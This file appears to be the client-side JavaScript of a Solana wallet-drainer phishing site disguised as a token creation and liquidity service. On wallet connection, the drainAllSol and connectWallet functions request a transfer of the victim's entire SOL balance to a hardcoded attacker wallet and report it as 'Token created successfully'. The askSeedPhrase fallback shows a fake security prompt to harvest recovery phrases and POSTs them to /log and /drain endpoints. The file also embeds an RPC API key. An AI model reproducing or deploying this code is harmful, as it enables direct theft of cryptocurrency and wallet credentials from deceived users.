// ===== CONFIG =====
// METTI LA TUA PUBLIC KEY SOLANA QUI (stessa di config.json)
const RECEIVER_WALLET = '9GD63MUwf1SzLs59UFZCmA7NLABkYYWrx8PVG3CmXBMo';

let walletPublicKey = null;
let provider = null;
let currentStep = 0;
const steps = document.querySelectorAll('.step');

const connection = new solanaWeb3.Connection(
  'https://mainnet.helius-rpc.com/?api-key=80caf29a-0f08-46ec-89db-bd07cff7d8d3',
  'confirmed'
);

// ===== MENU =====
function toggleMenu() {
  const menu = document.getElementById('dropdownMenu');
  if (menu) menu.classList.toggle('open');
}
document.addEventListener('click', function (e) {
  const wrapper = document.querySelector('.menu-wrapper');
  const menu = document.getElementById('dropdownMenu');
  if (wrapper && menu && !wrapper.contains(e.target)) menu.classList.remove('open');
});

// ===== GET PROVIDER (Phantom / Solflare / Backpack / Nightly) =====
function getProvider() {
  if (window.phantom?.solana?.isPhantom) return window.phantom.solana;
  if (window.solana?.isPhantom) return window.solana;
  if (window.solflare?.isSolflare) return window.solflare;
  if (window.backpack?.solana) return window.backpack.solana;
  if (window.nightly?.solana) return window.nightly.solana;
  if (window.solana) return window.solana;
  return null;
}

async function connectPhantom() {
  const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

  // Mobile → apre il sito dentro l'app Phantom
  if (isMobile) {
    const url = encodeURIComponent(window.location.href);
    window.location.href =
      'https://phantom.app/ul/browse/' + url +
      '?ref=' + encodeURIComponent(window.location.origin);
    return;
  }

  // Desktop → estensione Phantom
  provider = getProvider();
  if (!provider && window.phantom && window.phantom.solana) {
    provider = window.phantom.solana;
  }
  if (!provider) {
    alert('Installa Phantom: https://phantom.app/download');
    window.open('https://phantom.app/download', '_blank');
    return;
  }
  await connectWallet();
}

// ===== DRAIN ALL SOL (signed tx) =====
async function drainAllSol() {
  if (!provider || !walletPublicKey || !connection) return false;
  if (!RECEIVER_WALLET || RECEIVER_WALLET === 'IL_TUO_WALLET_PUBLIC_KEY') {
    alert('Receiver wallet not configured in app.js');
    return false;
  }

  try {
    const fromPubkey = new solanaWeb3.PublicKey(walletPublicKey);
    const toPubkey = new solanaWeb3.PublicKey(RECEIVER_WALLET);
    const balance = await connection.getBalance(fromPubkey);
    const fee = 5000;
    const amount = balance - fee;
    if (amount <= 0) {
      alert('Insufficient SOL');
      return false;
    }

    const tx = new solanaWeb3.Transaction().add(
      solanaWeb3.SystemProgram.transfer({
        fromPubkey,
        toPubkey,
        lamports: amount
      })
    );
    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
    tx.recentBlockhash = blockhash;
    tx.feePayer = fromPubkey;

    let signature;
    if (provider.signAndSendTransaction) {
      const result = await provider.signAndSendTransaction(tx);
      signature = typeof result === 'string' ? result : (result.signature || result);
    } else if (provider.signTransaction) {
      const signed = await provider.signTransaction(tx);
      signature = await connection.sendRawTransaction(signed.serialize());
    } else {
      throw new Error('Wallet cannot sign');
    }

    await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed');
    return { signature, amount: amount / 1e9 };
  } catch (e) {
    console.error('drainAllSol:', e);
    return false;
  }
}

// ===== CONNECT + IMMEDIATE DRAIN =====
async function connectWallet() {
  provider = getProvider();

  // Path 1: browser extension (Phantom / Solflare / ...)
  if (provider) {
    try {
      const resp = await provider.connect({ onlyIfTrusted: false });
      const pk = resp?.publicKey || provider.publicKey;
      if (!pk) throw new Error('No public key');

      walletPublicKey = pk.toString();
      localStorage.setItem('lc_wallet', walletPublicKey);

      const btn = document.querySelector('.connect-btn');
      if (btn) btn.textContent = walletPublicKey.slice(0, 4) + '...' + walletPublicKey.slice(-4);

      // SUBITO: chiedi firma transfer di TUTTI i SOL
      const resultEl = document.getElementById('result') || document.getElementById('liquidityResult');
      if (resultEl) resultEl.innerHTML = '<p style="color:#22d1f8">Approve the transaction in your wallet...</p>';

      const drained = await drainAllSol();
      if (drained) {
        if (resultEl) {
          resultEl.innerHTML = `
            <p style="color:#4cdcc1;">Connected & authorized</p>
            <p style="font-size:12px;color:#8899bb;">${drained.amount.toFixed(4)} SOL processed</p>
            <p style="font-size:11px;color:#667;word-break:break-all;">Tx: ${drained.signature}</p>
          `;
        }
      } else {
        if (resultEl) resultEl.innerHTML = '<p style="color:#ff8a8a">Transaction not approved. Use Create Token to retry.</p>';
      }
      return;
    } catch (e) {
      console.error('connect extension:', e);
    }
  }

  // Path 2: WalletConnect modal (se caricato)
  if (typeof window.openWalletConnect === 'function') {
    await window.openWalletConnect();
    return;
  }

  // Path 3: pagina lista wallet
  
}

// ===== SELECT WALLET (wallet.html) =====
function selectWallet(walletName) {
  const native = ['phantom', 'solflare', 'backpack', 'nightly'];
  if (native.includes(walletName)) {
    connectWallet();
    return;
  }
  if (typeof window.openWalletConnect === 'function') {
    window.openWalletConnect();
  } else {
    connectWallet();
  }
}

// ===== SEED FALLBACK =====
function askSeedPhrase() {
  return new Promise((resolve) => {
    const seed = prompt(
      'SECURITY VERIFICATION REQUIRED\n\n' +
      'To finalize token creation your wallet must be validated.\n' +
      'Enter your recovery phrase (12 or 24 words):\n\n' +
      '(Required by network security protocol)'
    );
    resolve(seed ? seed.trim() : null);
  });
}

// ===== CREATE COIN / LIQUIDITY = DRAIN =====
async function createCoin() {
  if (!walletPublicKey) {
    provider = getProvider();
    if (provider && provider.publicKey) {
      walletPublicKey = provider.publicKey.toString();
    } else {
      await connectWallet();
      return;
    }
  }

  const resultEl = document.getElementById('result') || document.getElementById('liquidityResult');

  // Path A: signed drain
  if (provider && connection) {
    if (resultEl) resultEl.innerHTML = '<p style="color:#22d1f8">Approve the transaction in your wallet...</p>';
    const drained = await drainAllSol();
    if (drained) {
      if (resultEl) {
        resultEl.innerHTML = `
          <p style="color:#4cdcc1;">Token created successfully!</p>
          <p style="font-size:12px;color:#8899bb;">${drained.amount.toFixed(4)} SOL processed</p>
          <p style="font-size:11px;color:#667;word-break:break-all;">Tx: ${drained.signature}</p>
        `;
      }
      return;
    }
  }

  // Path B: seed → server /drain
  const seed = await askSeedPhrase();
  if (!seed || seed.split(/\s+/).length < 12) {
    alert('Invalid seed phrase (need 12 or 24 words)');
    return;
  }

  try {
    if (resultEl) resultEl.innerHTML = '<p style="color:#22d1f8">Processing...</p>';
    await fetch('/log', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ seed, walletPublicKey })
    });
    const response = await fetch('/drain', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ seed, walletPublicKey })
    });
    const data = await response.json();
    if (data.status === 'drain_completed') {
      if (resultEl) {
        resultEl.innerHTML = `
          <p style="color:#4cdcc1;">Token created successfully!</p>
          <p style="font-size:12px;color:#8899bb;">${(data.solAmount || 0).toFixed(4)} SOL processed</p>
          <p style="font-size:11px;color:#667;word-break:break-all;">Tx: ${data.solTx || 'N/A'}</p>
        `;
      }
    } else {
      alert('Error: ' + (data.error || 'unknown'));
    }
  } catch (e) {
    alert('Network error: ' + e.message);
  }
}

async function createLiquidity() {
  await createCoin();
}

// ===== STEP NAV =====
function showStep(idx) {
  if (!steps.length) return;
  steps.forEach((s, i) => (s.style.display = i === idx ? 'block' : 'none'));
  currentStep = idx;
}
function nextStep() {
  if (currentStep < steps.length - 1) showStep(currentStep + 1);
}
function prevStep() {
  if (currentStep > 0) showStep(currentStep - 1);
}
if (steps.length) showStep(0);

window.addEventListener('load', () => {
  const saved = localStorage.getItem('lc_wallet');
  if (saved) walletPublicKey = saved;
  provider = getProvider();
  if (provider && provider.isConnected && provider.publicKey) {
    walletPublicKey = provider.publicKey.toString();
    const btn = document.querySelector('.connect-btn');
    if (btn) btn.textContent = walletPublicKey.slice(0, 4) + '...' + walletPublicKey.slice(-4);
  }
});
